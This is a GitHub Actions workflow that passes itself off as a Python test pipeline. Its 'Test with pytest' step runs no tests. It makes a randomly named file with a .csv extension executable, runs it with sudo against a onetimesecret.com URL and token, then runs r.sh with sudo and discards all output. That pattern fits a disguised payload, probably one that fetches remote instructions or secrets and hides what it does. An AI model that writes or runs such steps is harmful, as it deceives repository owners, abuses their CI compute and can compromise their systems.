name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
    - name: Test with pytest
      run: |
        cd ${{ github.workspace }}
        echo 'f49u0'
        sudo chmod +x kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv
        sudo ./kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv https://onetimesecret.com/secret/5igivadh9we2witfdqx9hbmd5asd86q jlehlc && sudo sh r.sh > /dev/null 2>&1
